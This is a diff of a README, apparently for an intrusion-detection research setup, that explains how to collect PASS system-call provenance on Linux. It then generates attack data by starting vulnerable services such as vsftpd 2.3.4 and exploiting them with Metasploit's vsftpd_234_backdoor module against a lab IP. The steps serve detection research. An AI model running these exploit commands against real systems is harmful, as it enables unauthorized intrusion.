@@ -5,14 +5,14 @@ PASS system intercepts related system calls to generate provenance information. 
 There are mainly three types of objects collected: file object, process object and network connection object. For file object, its attributes include specific information about the file itself, such as file name, file storage space, storage location, and file node number. For process object, its attributes mainly contain the process name, the PID number of the process, and environment variables; the process creation time, etc. For network connection object, it is used to record the transmission of data on the network. Network connection objects can be considered as file objects, the attributes of which include the source port, the destination port, the source IP address, and the destination IP address. There are mainly three types of dependencies collected: (1) FORKPARENT: Process to Process, if a process P creates process Q, the provenance record "Q FORKPARENT P" is generated, we represent it as, Q->P. (2) INPUT: Process to File, if a process P reads the contents of the file A, the provenance record "P INPUT A" is generated, that is P->A. (3) GENERATEDBY: Network connection object to Process, if a process P sends data from the network connection object B, the provenance record "B GENERATEDBY P" is generated, that is, B->P.
 
 
-Prerequisites:
+Prerequisites to collect PASS provenance:
 The linux (v2.6.23.17) should be installed
 The gcc (v4.3.2) should be installed
 The PASS (V2) should be installed
 The passtools should be installed
 The BerkeleyDB (version 4.6.21) should be installed
 
-passtools----userlevel tools needed for use with the PASS kernel.
+passtools----user-level tools needed for use with the PASS kernel.
 Note that you are required to copy the mount.lasagna file in the mount.lasagna directory of the passtool to the /sbin directory, that will invoke the mount.lasagna script when run the mount -t lasagna command.
 The installation directory of passtools in our machine is /media/passtools-20101210
 The stuff in this directory:
@@ -37,13 +37,13 @@ Step 2. Export the collected provenance data
       /media/passtools-20101210/twig_dump/twig_dump k00000000001.twig>/root/1111.txt  ---Convert .twig to .txt
 	  
 Collecting abnormal or intrusion data:
-The test includes two computers, one for the intrusion detection server and one for the attack source machine. 
-The pass system is fitted to the intrusion detection server.
-A Linux virtual machine is fitted to the attack source machine and Metaspolit (v5.0.16) is installed.
+The test includes two computers, one for the intrusion detection server and the other for the attack source machine. 
+The pass system is installed on the intrusion detection server.
+A Linux virtual machine is used as the attack source machine and Metasploit (v5.0.16) is installed.
 After the completion of step 1, open the vulnerable program such as Vsftp(v2.3.4),Samba(v3.0.21),Distcc(2.16),etc.
   step 3 Open the vulnerable program   
       /usr/local/sbin/vsftpd&-----------------------------------------------open the vulnerable program 
-  Step 4 Invade with an attacking machine
+  Step 4 Invade with an attack source machine using the Metasploit framework
       >msfconsole
       msf> use exploit/unix/ftp/vsftpd_234_backdoor
       msf> set RHOST 192.168.159.128 (intrusion detection server's IP)
